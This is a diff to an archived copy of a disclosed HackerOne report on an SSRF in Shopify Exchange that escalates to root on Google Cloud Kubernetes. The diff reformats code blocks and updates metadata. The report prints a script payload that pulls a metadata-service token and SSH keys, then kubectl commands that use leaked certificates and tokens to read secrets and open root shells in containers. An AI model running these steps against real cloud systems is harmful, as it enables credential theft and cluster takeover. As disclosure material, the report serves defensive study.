@@ -21,7 +21,7 @@ canonical_url: ""
 cited_by:
   - "2018.md:39"
 commit: ""
-content_sha256: 529a8107ee32ba0929672f330677da30ad81fe0bf5ca7aa26e073c54d8bbabe1
+content_sha256: f8305dc77179df3a988eba26be8abb6201fea0c97affec6e27e624aff0b83ddb
 depth: full
 depth_reason: default
 kind: article
@@ -31,10 +31,10 @@ original_url: "https://hackerone.com/reports/341876"
 published: ""
 publisher: HackerOne
 publisher_english: ""
-raw_sha256: 427c984f6d53d1c4558670efbe15c5470650d6ab72a5691721c4136bd502d1d3
+raw_sha256: 3dd87fb5d23e2ea339a514c75494c6add1e7407a0a68f7d739cd1cabf322b1e8
 retrieved_from: "https://hackerone.com/reports/341876"
 retrieved_kind: browser
-retrieved_utc: "2026-08-09T02:39:32+00:00"
+retrieved_utc: "2026-09-14T09:15:40+00:00"
 slug: hackerone-shopify-disclosed-hackerone-ssrf-exchange-leads-root
 snapshot: ""
 title_english: ""
@@ -48,12 +48,12 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <https://hackerone.com/reports/341876>
-- Preserved from: https://hackerone.com/reports/341876 (browser) on 2026-08-09
+- Preserved from: https://hackerone.com/reports/341876 (browser) on 2026-09-14
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
-archive of a source from the Web Hacking Techniques Index collections, kept so the
-page going offline. To read the original, follow the link above.
+archive of a source from the Web Hacking Techniques Index collections, kept so
+it remains readable if the page goes offline. To read the original, follow the link above.
 
 ## Content
 
@@ -96,7 +96,12 @@ April 22, 2018, 11:39pm UTC
 
 **Code**•228 Bytes
 
-1<script> 2window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"; 3// iframes don't work here because Google Cloud sets the `X-Frame-Options: SAMEORIGIN` header. 4</script>
+```
+<script>
+window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";
+// iframes don't work here because Google Cloud sets the `X-Frame-Options: SAMEORIGIN` header.
+</script>
+```
 
 - 3: Go to [https://exchange.shopify.com/create-a-listing](https://exchange.shopify.com/create-a-listing) and install the Exchange app
 - 4: Wait for the store screenshot to appear on the Create Listing page
@@ -110,7 +115,11 @@ I tried to leak more data, but the web screenshot software wasn't producing any 
 
 **Code**•130 Bytes
 
-1<script> 2window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json"; 3</script>
+```
+<script>
+window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json";
+</script>
+```
 
 {F289081}
 
@@ -118,21 +127,52 @@ I tried to leak more data, but the web screenshot software wasn't producing any 
 
 **Code**•259 Bytes
 
-1curl -X POST "https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata" -H "Authorization: Bearer ██████████████" -H "Content-Type: application/json" --data '{"items": [{"key": "0xACB", "value": "test"}]}'
+```
+curl -X POST "https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata" -H "Authorization: Bearer ██████████████" -H "Content-Type: application/json" --data '{"items": [{"key": "0xACB", "value": "test"}]}'
+```
 
 **Code**•516 Bytes
 
-1{ 2 "error": { 3 "errors": [ 4 { 5 "domain": "global", 6 "reason": "forbidden", 7 "message": "Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/███████'" 8 }, 9 { 10 "domain": "global", 11 "reason": "forbidden", 12 "message": "Required 'iam.serviceAccounts.actAs' permission for 'projects/███████'" 13 } 14 ], 15 "code": 403, 16 "message": "Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/████████'" 17 } 18}
+```
+{
+ "error": {
+ "errors": [
+ {
+ "domain": "global",
+ "reason": "forbidden",
+ "message": "Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/███████'"
+ },
+ {
+ "domain": "global",
+ "reason": "forbidden",
+ "message": "Required 'iam.serviceAccounts.actAs' permission for 'projects/███████'"
+ }
+ ],
+ "code": 403,
+ "message": "Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/████████'"
+ }
+}
+```
 
 I checked the scopes for this token and there was no read/write access to the Compute Engine API:
 
 **Code**•121 Bytes
 
-1curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=██████████████████"
+```
+curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=██████████████████"
+```
 
 **Code**•175 Bytes
 
-1{ 2 "issued_to": "███████", 3 "audience": "███", 4 "scope": "https://www.googleapis.com/auth/cloud-platform", 5 "expires_in": 1307, 6 "access_type": "offline" 7}
+```
+{
+ "issued_to": "███████",
+ "audience": "███",
+ "scope": "https://www.googleapis.com/auth/cloud-platform",
+ "expires_in": 1307,
+ "access_type": "offline"
+}
+```
 
 ### 2 - Dumping kube-env
 
@@ -150,19 +190,86 @@ Result: {F289456}
 
 **Code**•409 Bytes
 
-1-----BEGIN CERTIFICATE----- 2██████ 3███████ 4███████ 5████████ 6██████████████ 7████████ 8████████ 9███████ 10████ 11██████ 12███ 13█████████ 14████ 15████ 16████████ 17███████ 18███ 19-----END CERTIFICATE-----
+```
+-----BEGIN CERTIFICATE-----
+██████
+███████
+███████
+████████
+██████████████
+████████
+████████
+███████
+████
+██████
+███
+█████████
+████
+████
+████████
+███████
+███
+-----END CERTIFICATE-----
+```
 
 **client.crt**
 
 **Code**•378 Bytes
 
-1-----BEGIN CERTIFICATE----- 2█████ 3███████ 4██████ 5████████ 6██████████ 7█████ 8██████ 9█████ 10█████ 11██████████ 12███████ 13█████ 14████ 15████ 16████████ 17████████ 18-----END CERTIFICATE-----
+```
+-----BEGIN CERTIFICATE-----
+█████
+███████
+██████
+████████
+██████████
+█████
+██████
+█████
+█████
+██████████
+███████
+█████
+████
+████
+████████
+████████
+-----END CERTIFICATE-----
+```
 
 **client.pem**
 
 **Code**•608 Bytes
 
-1-----BEGIN RSA PRIVATE KEY----- 2█████████ 3██████ 4████████ 5████ 6████ 7█████████ 8██████████ 9██████ 10████████ 11█████████ 12██████ 13██████████ 14███ 15██████████ 16███ 17██████ 18█████████ 19████████ 20██████████ 21█████████ 22████ 23████ 24████████ 25████ 26███████ 27-----END RSA PRIVATE KEY-----
+```
+-----BEGIN RSA PRIVATE KEY-----
+█████████
+██████
+████████
+████
+████
+█████████
+██████████
+██████
+████████
+█████████
+██████
+██████████
+███
+██████████
+███
+██████
+█████████
+████████
+██████████
+█████████
+████
+████
+████████
+████
+███████
+-----END RSA PRIVATE KEY-----
+```
 
 **MASTER_NAME**: █████
 
@@ -172,39 +279,152 @@ It's possible to list all pods {F289460}:
 
 **Code**•415 Bytes
 
-1$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get pods --all-namespaces 2 3NAMESPACE NAME READY STATUS RESTARTS AGE 4████████ ██████████ 1/1
+```
+$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get pods --all-namespaces
+
+NAMESPACE                                   NAME                                                              READY     STATUS             RESTARTS   AGE
+████████                    ██████████                    1/1    
+```
 
 And create new pods as well:
 
 **Code**•435 Bytes
 
-1$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://████████ create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml 2 3pod "shell-demo" created 4$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████████ delete pod shell-demo 5 6pod "shell-demo" deleted
+```
+$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://████████ create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml
+
+pod "shell-demo" created
+$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████████ delete pod shell-demo
+
+pod "shell-demo" deleted
+```
 
 I didn't tried to delete running pods, obviously, I'm not sure if I would be able to delete them with user `████████`. However, it's not possible to execute commands in this new pod or any other pod:
 
 **Code**•332 Bytes
 
-1$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://█████████ exec -it shell-demo -- /bin/bash 2 3Error from server (Forbidden): pods "shell-demo" is forbidden: User "███" cannot create pods/exec in the namespace "default": Unknown user "███"
+```
+$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://█████████ exec -it shell-demo -- /bin/bash
+
+Error from server (Forbidden): pods "shell-demo" is forbidden: User "███" cannot create pods/exec in the namespace "default": Unknown user "███"
+```
 
 The `get secrets` command doesn't work, but it's possible to describe a given pod and the get the secret using its name. That's how I leaked the kubernetes.io service account token using the instance `████` from the namespace `████`:
 
 **Code**•1.82 KiB
 
-1$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://███ describe pods/█████ -n █████████ 2 3Name: ████████ 4Namespace: ██████ 5Node: ██████████ 6Start Time: Fri, 23 Mar 2018 13:53:13 +0000 7Labels: █████ 8 ████ 9 █████ 10Annotations: <none> 11Status: Running 12IP: █████████ 13Controlled By: █████ 14Containers: 15 default-http-backend: 16 Container ID: docker://███ 17 Image: ██████ 18 Image ID: docker-pullable://█████ 19 Port: ████/TCP 20 Host Port: 0/TCP 21 State: Running 22 Started: Sun, 22 Apr 2018 03:23:09 +0000 23 Last State: Terminated 24 Reason: Error 25 Exit Code: 2 26 Started: Fri, 20 Apr 2018 23:39:21 +0000 27 Finished: Sun, 22 Apr 2018 03:23:07 +0000 28 Ready: True 29 Restart Count: 180 30 Limits: 31 cpu: 10m 32 memory: 20Mi 33 Requests: 34 cpu: 10m 35 memory: 20Mi 36 Liveness: http-get http://:███/healthz delay=30s timeout=5s period=10s #success=1 #failure=3 37 Environment: <none> 38 Mounts: 39 ██████ 40Conditions: 41 Type Status 42 Initialized True 43 Ready True 44 PodScheduled True 45Volumes: 46 ██████████: 47 Type: Secret (a volume populated by a Secret) 48 SecretName: ███████ 49 Optional: false 50QoS Class: Guaranteed 51Node-Selectors: <none> 52Tolerations: node.kubernetes.io/not-ready:NoExecute for 300s 53 node.kubernetes.io/unreachable:NoExecute for 300s 54Events: <none>
+```
+$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://███ describe pods/█████ -n █████████
+
+Name:           ████████
+Namespace:      ██████
+Node:           ██████████
+Start Time:     Fri, 23 Mar 2018 13:53:13 +0000
+Labels:         █████
+                ████
+                █████
+Annotations:    <none>
+Status:         Running
+IP:             █████████
+Controlled By:  █████
+Containers:
+  default-http-backend:
+    Container ID:   docker://███
+    Image:          ██████
+    Image ID:       docker-pullable://█████
+    Port:           ████/TCP
+    Host Port:      0/TCP
+    State:          Running
+      Started:      Sun, 22 Apr 2018 03:23:09 +0000
+    Last State:     Terminated
+      Reason:       Error
+      Exit Code:    2
+      Started:      Fri, 20 Apr 2018 23:39:21 +0000
+      Finished:     Sun, 22 Apr 2018 03:23:07 +0000
+    Ready:          True
+    Restart Count:  180
+    Limits:
+      cpu:     10m
+      memory:  20Mi
+    Requests:
+      cpu:        10m
+      memory:     20Mi
+    Liveness:     http-get http://:███/healthz delay=30s timeout=5s period=10s #success=1 #failure=3
+    Environment:  <none>
+    Mounts:
+      ██████
+Conditions:
+  Type           Status
+  Initialized    True
+  Ready          True
+  PodScheduled   True
+Volumes:
+ ██████████:
+    Type:        Secret (a volume populated by a Secret)
+    SecretName: ███████
+    Optional:    false
+QoS Class:       Guaranteed
+Node-Selectors:  <none>
+Tolerations:     node.kubernetes.io/not-ready:NoExecute for 300s
+                 node.kubernetes.io/unreachable:NoExecute for 300s
+Events:          <none>
+```
 
 **Code**•760 Bytes
 
-1$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get secret███████ -n ███████ -o yaml 2 3apiVersion: v1 4data: 5 ca.crt: ██████████ 6 namespace: ████ 7 token: ██████████== 8kind: Secret 9metadata: 10 annotations: 11 kubernetes.io/service-account.name: default 12 kubernetes.io/service-account.uid: ████ 13 creationTimestamp: 2017-01-23T16:08:19Z 14 name:█████ 15 namespace: ██████████ 16 resourceVersion: "115481155" 17 selfLink: /api/v1/namespaces/████████/secrets/████ 18 uid: █████████ 19type: kubernetes.io/service-account-token
+```
+$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get secret███████ -n ███████ -o yaml
+
+apiVersion: v1
+data:
+  ca.crt: ██████████
+  namespace: ████
+  token: ██████████==
+kind: Secret
+metadata:
+  annotations:
+    kubernetes.io/service-account.name: default
+    kubernetes.io/service-account.uid: ████
+  creationTimestamp: 2017-01-23T16:08:19Z
+  name:█████
+  namespace: ██████████
+  resourceVersion: "115481155"
+  selfLink: /api/v1/namespaces/████████/secrets/████
+  uid: █████████
+type: kubernetes.io/service-account-token
+```
 
 And finally, it's possible to use this token to get a shell in any container:
 
 **Code**•569 Bytes
 
-1$ kubectl --certificate-authority ca.crt --server https://████ --token "█████.██████.███" exec -it w█████████ -- /bin/bash 2 3Defaulting container name to web. 4Use 'kubectl describe pod/w█████████' to see all of the containers in this pod. 5███████:/# id 6uid=0(root) gid=0(root) groups=0(root) 7█████:/# ls 8app boot dev exec key lib64 mnt proc run srv start tmp var 9bin build etc home lib media opt root sbin ssl sys usr 10███████:/# exit
+```
+$ kubectl --certificate-authority ca.crt --server https://████ --token "█████.██████.███" exec -it w█████████ -- /bin/bash
+
+Defaulting container name to web.
+Use 'kubectl describe pod/w█████████' to see all of the containers in this pod.
+███████:/# id
+uid=0(root) gid=0(root) groups=0(root)
+█████:/# ls
+app  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var
+bin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr
+███████:/# exit
+```
 
 **Code**•623 Bytes
 
-1$ kubectl --certificate-authority ca.crt --server https://███████ --token "█████.██████.█████████" exec -it ████████ -n ████████ -- /bin/bash 2 3Defaulting container name to web. 4Use 'kubectl describe pod/█████ -n █████' to see all of the containers in this pod. 5root@████:/# id 6uid=0(root) gid=0(root) groups=0(root) 7root@████:/# ls 8app boot dev exec key lib64 mnt proc run srv start tmp var 9bin build etc home lib media opt root sbin ssl sys usr 10root@█████:/# exit
+```
+$ kubectl --certificate-authority ca.crt --server https://███████ --token "█████.██████.█████████" exec -it ████████ -n ████████ -- /bin/bash
+
+Defaulting container name to web.
+Use 'kubectl describe pod/█████ -n █████' to see all of the containers in this pod.
+root@████:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@████:/# ls
+app  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var
+bin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr
+root@█████:/# exit
+```
 
 ---
 
@@ -387,3 +607,7 @@ June 15, 2018, 5:38pm UTC
 changed the scope from **your-store.myshopify.com** to **https://exchangemarketplace.com/**.
 
 June 15, 2018, 5:38pm UTC
+
+## Recovery notes
+
+Source evidence recovered on 2026-09-14. The earlier source capture (SHA-256 `427c984f6d53d1c4558670efbe15c5470650d6ab72a5691721c4136bd502d1d3`) is no longer available. This publication uses a separately preserved capture of the same document recorded on 2026-09-14 (SHA-256 `3dd87fb5d23e2ea339a514c75494c6add1e7407a0a68f7d739cd1cabf322b1e8`). The complete exposed report and discussion were checked against this capture. Code examples now retain their source line breaks and characters in fenced blocks, and missing section headings were restored where present. The existing technique summary remains applicable. The missing earlier capture remains documented in the archive history.
